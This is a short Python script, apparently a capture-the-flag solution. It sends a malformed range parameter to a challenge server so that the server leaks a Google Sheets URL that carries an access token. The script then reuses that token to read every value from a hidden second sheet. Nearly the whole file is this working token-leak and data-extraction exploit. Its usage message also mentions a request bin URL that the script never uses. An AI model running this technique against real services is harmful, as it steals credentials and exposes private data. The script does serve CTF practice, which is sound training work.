
# For the OAuth operations
import sys
from oauth2client.service_account import ServiceAccountCredentials
import google.auth
import traceback
import requests
import json
import re
from urllib.parse import urlparse, parse_qs

def getSheetName(spreadsheet_id, access_token):
    response = requests.get("https://sheets.googleapis.com/v4/spreadsheets/" + spreadsheet_id + "?access_token=" + access_token,)
    results = json.loads(response.text)
    # We want the second sheet's id 
    sheet_name = results['sheets'][1]['properties']['title']
    return sheet_name

API_URL = "https://sheets.googleapis.com/v4/spreadsheets/"
if len(sys.argv) != 2:
    print("Please specify challenge URL and request bin URL")
    print("python solution.py <challenge-url>")
    print("E.g, python solution.py http://127.0.0.1:8000")
    exit()
response = requests.get(sys.argv[1] + "/color?range_start=AAAAAAA")
text = response.text
regex = r"https://(.+)"

matches = re.findall(regex, text)

if matches:
  url = "https://" + matches[0]
  parsed_url = urlparse(url)
  query_string = parse_qs(parsed_url.query)
  access_token = query_string['access_token'][0]
  spreadsheet_id = parsed_url.path.split('/')[3]
  sheet_name = getSheetName(spreadsheet_id, access_token)
  range_string = sheet_name + "!1:1000"
  response = requests.get("https://sheets.googleapis.com/v4/spreadsheets/" + spreadsheet_id + "/values/" + range_string + "?access_token=" + access_token)
  results = json.loads(response.text)
  print(results['values'])

else:
  print("No URLs found")
# results = json.loads(response.text)



